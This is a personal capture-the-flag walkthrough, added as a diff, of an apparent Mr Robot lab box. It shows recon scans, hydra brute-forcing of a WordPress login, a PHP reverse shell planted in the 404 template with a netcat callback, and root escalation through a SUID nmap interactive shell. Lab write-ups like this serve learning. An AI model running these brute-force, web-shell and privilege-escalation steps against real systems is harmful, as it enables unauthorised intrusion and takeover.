@@ -1,0 +1,156 @@
+ip : 10.10.241.103
+
+rustscan -a 10.10.241.103
+
+Open 10.10.241.103:80
+Open 10.10.241.103:443
+
+
+nmap -sC -sV 10.10.241.103
+
+PORT    STATE SERVICE  REASON  VERSION
+80/tcp  open  http     syn-ack Apache httpd
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Site doesn't have a title (text/html).
+443/tcp open  ssl/http syn-ack Apache httpd
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Site doesn't have a title (text/html).
+| ssl-cert: Subject: commonName=www.example.com
+| Issuer: commonName=www.example.com
+| Public Key type: rsa
+| Public Key bits: 1024
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2015-09-16T10:45:03
+| Not valid after:  2025-09-13T10:45:03
+| MD5:   3c16 3b19 87c3 42ad 6634 c1c9 d0aa fb97
+| SHA-1: ef0c 5fa5 931a 09a5 687c a2c2 80c4 c792 07ce f71b
+| -----BEGIN CERTIFICATE-----
+| MIIBqzCCARQCCQCgSfELirADCzANBgkqhkiG9w0BAQUFADAaMRgwFgYDVQQDDA93
+| d3cuZXhhbXBsZS5jb20wHhcNMTUwOTE2MTA0NTAzWhcNMjUwOTEzMTA0NTAzWjAa
+| MRgwFgYDVQQDDA93d3cuZXhhbXBsZS5jb20wgZ8wDQYJKoZIhvcNAQEBBQADgY0A
+| MIGJAoGBANlxG/38e8Dy/mxwZzBboYF64tu1n8c2zsWOw8FFU0azQFxv7RPKcGwt
+| sALkdAMkNcWS7J930xGamdCZPdoRY4hhfesLIshZxpyk6NoYBkmtx+GfwrrLh6mU
+| yvsyno29GAlqYWfffzXRoibdDtGTn9NeMqXobVTTKTaR0BGspOS5AgMBAAEwDQYJ
+| KoZIhvcNAQEFBQADgYEASfG0dH3x4/XaN6IWwaKo8XeRStjYTy/uBJEBUERlP17X
+| 1TooZOYbvgFAqK8DPOl7EkzASVeu0mS5orfptWjOZ/UWVZujSNj7uu7QR4vbNERx
+| ncZrydr7FklpkIN5Bj8SYc94JI9GsrHip4mpbystXkxncoOVESjRBES/iatbkl0=
+|_-----END CERTIFICATE-----
+
+
+
+i visited the website on port 80 and by the help of an extention in firefox (wappalyzer) i came to know that website is using wordpress 4.3.1
+
+after that i did a gobuster scan
+
+
+gobuster dir -u http://10.10.241.103 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x txt,php,html -t 100
+
+gobuster gave alot of directories i found blog to be useful
+saw robots.txt and found 2 files
+
+User-agent: *
+fsocity.dic
+key-1-of-3.txt
+
+downloaded both of them
+
+
+after this i went to the /blog directory and found out this page isnt accisible so as this is a wordpress website i tried to
+visit the page wp-login.php
+
+and yes i llanded to the login page of the website! now i
+
+and i tried to login using admin admin
+
+but that didnt worked ! idk how though of using elliot as the user as i have searched for mr robot on google when i started this room!
+and saw Elliot is the main protagonist! after that!
+
+i tried to login in Elliot username and password admin
+
+this time this showed that Elliot username is correct and admin pass is wrong
+i though of using the wordlist i got on robots.txt fsociety.dic
+
+and used hydra to crack it
+
+but before that we  have to capture the loginn request the webserver is making to autheticate the user! you can do this simply by 
+going to the network section of the developers tool and and copying the request
+
+this was the request
+
+log=elliot&pwd=admin&wp-submit=Log+In&redirect_to=http%3A%2F%2Frobot.thm%2Fwp-admin%2F&testcookie=1
+
+so the hydra command was lke this
+
+hydra -l Elliot -P fsociety.dic  $IP http-post-form “/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Frobot.thm%2Fwp-admin%2F&testcookie=1:S=302” -f -Vv -t63
+
+
+
+after this i waited for sometime but havent got anything good after one hour so decided to see the results!
+
+one thing i noticed is some passwords are repeating so i decided to sort the wordlist first
+
+wc -l wordlist   <--- number of lines in wl
+sort wordlist > newwordlist.txt     <---- this will sort the wordlist and araange all the words properly
+uniq newwordlist.txt > newsort.txt    <---- this will give you a wordlist with only unique words
+
+now again use hydra to crack the password it will work this time password :  ER28-0652
+
+after loggin in we have to upload a payload it in! the most common way is to edit the page 404 page and upload a rev shell 
+
+i did that go to appearance and the edit and the edit the error404.php page with you rev shell payload written in php 
+you can download it from
+
+https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+
+change the ip to tun0 and port 
+
+now just try to visit any page one the website that isnt indexed on the website sile
+
+http://$ip/blog/aasda
+
+and dont forget to turn on the nc rev listener on other terminal
+
+this will give you a rev connection and now you have the shell in website
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+
+use this command to stabalize the shell! now i searched for the suid files
+
+
+$ find / -type f -perm -u=s 2>/dev/null
+
+
+/bin/ping
+/bin/umount
+/bin/mount
+/bin/ping6
+/bin/su
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/local/bin/nmap
+/usr/lib/openssh/ssh-keysign
+
+
+now you can see there is binary named nmap which have suid perms i visited gtfobins and tired to use the suid perms commands given there but it didnt worked idk why! 
+
+
+then i read the hint for root user i got  nmap 
+
+so i looked for priv esc using nmap and got that! 
+
+nmap version 3.81  is vulnerable and we can chnage to root user ! when given suid perms to nmap
+
+/usr/local/bin/nmap --interactive
+!sh
+
+this will change the user to root!
+
+
+and now we are root user! cheers!
